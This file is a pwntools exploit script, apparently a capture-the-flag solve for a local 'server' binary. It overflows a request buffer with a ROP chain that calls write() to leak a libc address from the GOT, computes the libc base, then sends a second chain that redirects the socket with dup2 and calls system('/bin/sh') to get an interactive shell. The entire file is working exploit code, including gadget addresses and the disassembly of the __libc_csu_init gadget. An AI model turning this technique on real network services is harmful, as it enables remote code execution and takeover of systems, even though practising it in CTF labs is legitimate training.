from pwn import *

elf = ELF('./server')
libc = ELF('./libc.so.6')	

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *recvline",
		"c"
	]))
elif args.REMOTE: # run ./server and ./solve.py REMOTE
	p = remote("localhost", 9080)
else:
	p = process(elf.path) 


POP_RDI = 0x0000000000401c93 # pop rdi ; ret
POP_RSI = 0x0000000000401698 # pop rsi ; ret
RET = 0x000000000040101a # ret
R14_R15 = 0x0000000000401c90 # pop r14 ; pop r15 ; ret
POP_RBP = 0x00000000004015cd # pop rbp ; ret

RDX_SET_GADGET = 0x0000000000401C67  # __libc_csu_init

#.text:401C67                 xor     ebx, ebx
#.text:401C69                 nop     dword ptr [rax+00000000h]
#.text:401C70
#.text:401C70 loc_401C70:                             ; CODE XREF: __libc_csu_init+54↓j
#.text:401C70                 mov     rdx, r14
#.text:401C73                 mov     rsi, r13
#.text:401C76                 mov     edi, r12d
#.text:401C79                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
#.text:401C7D                 add     rbx, 1
#.text:401C81                 cmp     rbp, rbx
#.text:401C84                 jnz     short loc_401C70
#.text:401C86
#.text:401C86 loc_401C86:                             ; CODE XREF: __libc_csu_init+35↑j
#.text:401C86                 add     rsp, 8
#.text:401C8A                 pop     rbx
#.text:401C8B                 pop     rbp
#.text:401C8C                 pop     r12
#.text:401C8E                 pop     r13
#.text:401C90                 pop     r14
#.text:401C92                 pop     r15
#.text:401C94                 retn


# unused - rdx is set to good value (0x8d) after calling write in http_response
def set_rdx(v):
	return b''.join([
		  p64(R14_R15)
		, p64(v)                   # 3rd arg for write()
		, p64(0x403E10)            # r15 - frame dummy ptr

		, p64(POP_RBP)             # here we are overwriting original socket fd :(
		, p64(1)                   # loop ending

		, p64(RDX_SET_GADGET)
		, p64(0x32323232)  # trash for rsp8
		, p64(0x40404040)  # trash for rbx
		, p64(0x41414141)  # trash for rbp
		, p64(0x42424242)  # trash for r12
		, p64(0x43434343)  # trash for r13
		, p64(0x44444444)  # trash for r14
		, p64(0x45454545)  # trash for r15
	])

p.send(
	b'A' * 0xFF
	+ b'\r'
	+ b'B' * 0x38

	# + set_rdx(0x8)           # count

	+ p64(POP_RSI)
	+ p64(elf.got['socket'])  # buf

	# + p64(POP_RDI)           # not needed, rdi is set to socket id already
	# + p64(4)                 # fd

	+ p64(elf.symbols['write'])

	# loop
	+ p64(elf.symbols['http_saba'])

	+ b'\r\n'
)

print(p.recvuntil(b'</html>\n', drop=True))
leak = p.recv(8)
leak = u64(leak.ljust(8, b'\x00'))
print(f'[+] socket@got {hex(leak)}')

libc.address = leak - libc.symbols['socket']
print(f'[+] libc base {hex(libc.address)}')

BINSH = next(libc.search(b"/bin/sh\x00"))
SYSTEM = libc.symbols["system"]
DUP2 = libc.symbols['dup2']

p.send(
	b'A' * 0xFF
	+ b'\r'
	+ b'B' * 0x38

	# dup2(4, 0)
	# + p64(POP_RDI)  # not needed, rdi is set to socket id already
	# + p64(0x4)

	+ p64(POP_RSI)
	+ p64(0x0)

	+ p64(DUP2)

	# dup2(4, 1)
	+ p64(POP_RSI)
	+ p64(0x1)

	+ p64(DUP2)

	+ p64(RET) # align stack

	# shell
	+ p64(POP_RDI)
	+ p64(BINSH)
	+ p64(SYSTEM)

	+ b'\r\n'
)

p.interactive()
